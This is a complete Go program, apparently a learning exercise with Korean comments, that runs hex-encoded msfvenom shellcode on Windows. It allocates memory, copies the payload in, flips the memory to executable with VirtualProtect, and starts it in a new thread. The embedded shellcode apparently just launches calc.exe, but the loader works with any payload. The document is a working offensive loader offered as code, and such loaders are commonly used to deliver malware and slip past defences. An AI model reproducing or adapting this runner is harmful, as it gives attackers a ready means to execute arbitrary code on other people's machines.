// shellcode runner

package main

// shellcode generated by msfvenom

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows" // go get golang.org/x/sys/windows
)

func main() {
    sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300")
    addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
    if err != nil{
        log.Fatal(err)
    }
    fmt.Printf("Allocated Memory address: 0x%x\n", addr)  // print the address of the allocated memory

    modntdll := syscall.NewLazyDLL("Ntdll.dll") // ntdll은 windows의 핵심 라이브러리, syscall.NewLazyDLL을 사용하여 DLL을 로드

    procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")
    procrtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    fmt.Println("wrote shellcode bytes to destination address")
    fmt.Println("changing permissions to rx")

    var oldProtect uint32 // 변수 oldProtect를 선언하여 메모리 보호 속성을 저장
    err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect) // VirtualProtect 함수를 사용하여 메모리 보호 속성을 변경 -> PAGE_EXECUTE_READ(rx) 속성으로 변경
    // &oldProtect : 메모리 보호 속성을 변경하기 전의 속성을 저장할 변수의 주소
    if err != nil {
        log.Fatalf("Error VirtualProtect Failed: %v", err) // %v는 임의의 값을 출력
    }

    modKernel32 := syscall.NewLazyDLL("kernel32.dll")
    procCreateThread := modKernel32.NewProc("CreateThread") // CreateThread 함수를 가져옴, 새로운 스레드를 생성
    tHandle, _, lastErr := procCreateThread.Call( // procCreateThread.Call 함수를 호출하여 새로운 스레드를 생성, _는 반환값을 무시
        uintptr(0), // lpThreadAttributes
        uintptr(0), // dwStackSize
        addr,       // lpStartAddress
        uintptr(0), // lpParameter
        uintptr(0), // dwCreationFlags
        uintptr(0), // lpThreadId
    )
    if tHandle == 0 {
        log.Fatalf("Unable to Create Thread: %v\n", lastErr)  // lastErr는 에러 메시지
    }

    fmt.Printf("Handle of newly created thread:  %x \n", tHandle)
    windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE) // 새로운 스레드가 종료될 때까지 대기, waitforsingleobject는 스레드가 종료될 때까지 대기 -> INFINITE는 무한대기
}